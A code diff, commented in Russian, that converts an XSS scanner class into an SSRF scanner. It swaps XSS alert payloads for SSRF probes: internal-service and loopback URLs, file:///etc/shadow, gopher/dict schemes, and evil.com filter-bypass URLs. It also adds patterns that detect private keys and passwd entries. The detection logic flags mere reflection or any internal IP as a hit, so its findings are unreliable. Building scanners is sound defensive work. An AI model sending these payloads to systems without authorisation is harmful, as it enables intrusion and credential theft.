@@ -1,66 +1,82 @@
 import logging
-from ..http_client import HttpClient
+from urllib.parse import urlparse, urljoin
+from ..http_client_adapter import AiohttpClientAdapter
 from typing import List, Dict, Optional
 import re
-from urllib.parse import urlparse, parse_qs, urlencode
+from urllib.parse import parse_qs, urlencode
 
 logger = logging.getLogger(__name__)
 
-class XSSScanner:
+class SSRFScanner:
     def __init__(self, client=None):
         # Инициализация HTTP клиента
-        self.client = client if client else HttpClient()
+        self.client = client if client else AiohttpClientAdapter()
         
-        # Список полезных нагрузок для тестирования XSS уязвимостей
+        # Список полезных нагрузок для тестирования SSRF уязвимостей
         self.payloads = [
-            # Базовые полезные нагрузки
-            '<script>alert(1)</script>',
-            '<img src=x onerror=alert(1)>',
-            '<svg onload=alert(1)>',
-            '<body onload=alert(1)>',
-            '<input autofocus onfocus=alert(1)>',
+            # Внутренние IP-адреса
+            'http://127.0.0.1',
+            'http://localhost',
+            'http://0.0.0.0',
+            'http://[::1]',
+            'http://[::]',
             
-            # Полезные нагрузки с кодировкой
-            '<script>alert(1)</script>'.encode('utf-8').hex(),
-            '<img src=x onerror=alert(1)>'.encode('utf-8').hex(),
+            # Внутренние сервисы
+            'http://127.0.0.1:22',  # SSH
+            'http://127.0.0.1:3306',  # MySQL
+            'http://127.0.0.1:5432',  # PostgreSQL
+            'http://127.0.0.1:27017',  # MongoDB
+            'http://127.0.0.1:6379',  # Redis
             
-            # Полезные нагрузки с обходом фильтров
-            '<scr<script>ipt>alert(1)</scr</script>ipt>',
-            '<img src=x onerror=alert(1)//',
-            '<svg><script>alert(1)</script></svg>',
+            # Внутренние протоколы
+            'file:///etc/passwd',
+            'file:///etc/hosts',
+            'file:///etc/shadow',
+            'gopher://127.0.0.1:3306/_',
+            'dict://127.0.0.1:3306/',
             
-            # Полезные нагрузки с событиями
-            '<img src=x onmouseover=alert(1)>',
-            '<div onmouseover=alert(1)>XSS</div>',
-            '<a onmouseover=alert(1)>XSS</a>',
+            # Обход фильтров
+            'http://127.0.0.1.xip.io',
+            'http://127.0.0.1.nip.io',
+            'http://127.0.0.1.127.0.0.1',
+            'http://127.0.0.1%23@evil.com',
+            'http://127.0.0.1%2523@evil.com',
             
-            # Полезные нагрузки с атрибутами
-            '<img src=x onerror=alert(1) x=>',
-            '<img src=x onerror=alert(1) x=',
-            '<img src=x onerror=alert(1) x',
-            
-            # Полезные нагрузки с JavaScript
-            'javascript:alert(1)',
-            'data:text/html,<script>alert(1)</script>',
-            'vbscript:msgbox(1)'
+            # DNS-обход
+            'http://localhost:80@evil.com',
+            'http://127.0.0.1:80@evil.com',
+            'http://[::1]:80@evil.com',
+            'http://127.0.0.1%00evil.com',
+            'http://127.0.0.1%0devil.com'
         ]
         
-        # Паттерны для поиска отраженных полезных нагрузок
-        self.reflection_patterns = [
-            r'<script[^>]*>.*?</script>',
-            r'<img[^>]*>',
-            r'<svg[^>]*>',
-            r'<body[^>]*>',
-            r'<input[^>]*>',
-            r'<div[^>]*>',
-            r'<a[^>]*>',
-            r'javascript:',
-            r'data:text/html',
-            r'vbscript:'
+        # Паттерны для определения внутренних IP-адресов
+        self.internal_ip_patterns = [
+            r'127\.\d+\.\d+\.\d+',
+            r'10\.\d+\.\d+\.\d+',
+            r'172\.(1[6-9]|2\d|3[0-1])\.\d+\.\d+',
+            r'192\.168\.\d+\.\d+',
+            r'\[::1\]',
+            r'\[::\]',
+            r'localhost',
+            r'0\.0\.0\.0'
+        ]
+        
+        # Паттерны для определения конфиденциальных данных
+        self.sensitive_patterns = [
+            r'root:.*:0:0:',
+            r'mysql:.*:',
+            r'postgres:.*:',
+            r'127\.0\.0\.1\s+localhost',
+            r'PRIVATE KEY',
+            r'BEGIN RSA PRIVATE KEY',
+            r'BEGIN DSA PRIVATE KEY',
+            r'BEGIN EC PRIVATE KEY',
+            r'BEGIN OPENSSH PRIVATE KEY'
         ]
 
     def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
-        # Основной метод сканирования, который проверяет XSS уязвимости
+        # Основной метод сканирования, который проверяет SSRF уязвимости
         vulnerabilities = []
         
         try:
@@ -74,12 +90,12 @@ class XSSScanner:
                 vulnerabilities.extend(form_vulns)
             
         except Exception as e:
-            logger.error(f"XSS scan error: {str(e)}")
+            logger.error(f"SSRF scan error: {str(e)}")
         
         return vulnerabilities
 
     def _check_url_params(self, url: str) -> List[Dict]:
-        # Проверка параметров URL на XSS уязвимости
+        # Проверка параметров URL на SSRF уязвимости
         vulnerabilities = []
         try:
             # Парсинг URL для получения параметров
@@ -105,7 +121,7 @@ class XSSScanner:
                             # Проверка на уязвимость
                             if self._is_vulnerable(response.text, payload):
                                 vulnerabilities.append({
-                                    'type': 'XSS',
+                                    'type': 'SSRF',
                                     'url': modified_url,
                                     'payload': payload,
                                     'evidence': self._get_evidence(response.text, payload),
@@ -124,7 +140,7 @@ class XSSScanner:
         return vulnerabilities
 
     def _check_forms(self, url: str, forms: List[Dict]) -> List[Dict]:
-        # Проверка форм на XSS уязвимости
+        # Проверка форм на SSRF уязвимости
         vulnerabilities = []
         try:
             for form in forms:
@@ -137,8 +153,8 @@ class XSSScanner:
                     field_name = field.get('name')
                     field_type = field.get('type', 'text')
                     
-                    # Пропуск полей, не подходящих для XSS
-                    if field_type not in ['text', 'textarea', 'hidden', 'search', 'email', 'url']:
+                    # Пропуск полей, не подходящих для SSRF
+                    if field_type not in ['text', 'textarea', 'hidden', 'search', 'url']:
                         continue
                     
                     for payload in self.payloads:
@@ -163,7 +179,7 @@ class XSSScanner:
                             # Проверка на уязвимость
                             if self._is_vulnerable(response.text, payload):
                                 vulnerabilities.append({
-                                    'type': 'XSS',
+                                    'type': 'SSRF',
                                     'url': action,
                                     'payload': payload,
                                     'evidence': self._get_evidence(response.text, payload),
@@ -182,21 +198,21 @@ class XSSScanner:
         return vulnerabilities
 
     def _is_vulnerable(self, response_text: str, payload: str) -> bool:
-        # Проверка, является ли ответ уязвимым к XSS
+        # Проверка, является ли ответ уязвимым к SSRF
         try:
+            # Проверка наличия внутренних IP-адресов
+            for pattern in self.internal_ip_patterns:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    return True
+            
+            # Проверка наличия конфиденциальных данных
+            for pattern in self.sensitive_patterns:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    return True
+            
             # Проверка отражения полезной нагрузки
             if payload in response_text:
                 return True
-            
-            # Проверка отражения с кодировкой
-            encoded_payload = payload.encode('utf-8').hex()
-            if encoded_payload in response_text:
-                return True
-            
-            # Проверка паттернов отражения
-            for pattern in self.reflection_patterns:
-                if re.search(pattern, response_text, re.IGNORECASE):
-                    return True
             
             return False
         
@@ -207,23 +223,24 @@ class XSSScanner:
     def _get_evidence(self, response_text: str, payload: str) -> str:
         # Получение доказательства уязвимости
         try:
-            # Поиск отраженной полезной нагрузки
+            # Поиск внутренних IP-адресов
+            for pattern in self.internal_ip_patterns:
+                match = re.search(pattern, response_text, re.IGNORECASE)
+                if match:
+                    return f"Internal IP address found: {match.group(0)}"
+            
+            # Поиск конфиденциальных данных
+            for pattern in self.sensitive_patterns:
+                match = re.search(pattern, response_text, re.IGNORECASE)
+                if match:
+                    return f"Sensitive data found: {match.group(0)}"
+            
+            # Поиск отражения полезной нагрузки
             if payload in response_text:
                 return f"Payload '{payload}' was reflected in the response"
             
-            # Поиск отражения с кодировкой
-            encoded_payload = payload.encode('utf-8').hex()
-            if encoded_payload in response_text:
-                return f"Encoded payload '{encoded_payload}' was reflected in the response"
-            
-            # Поиск паттернов отражения
-            for pattern in self.reflection_patterns:
-                match = re.search(pattern, response_text, re.IGNORECASE)
-                if match:
-                    return f"XSS pattern '{match.group(0)}' was found in the response"
-            
-            return "No direct evidence found"
+            return "SSRF vulnerability detected"
         
         except Exception as e:
             logger.error(f"Evidence collection error: {str(e)}")
-            return "Error collecting evidence"
+            return "Error collecting evidence" 
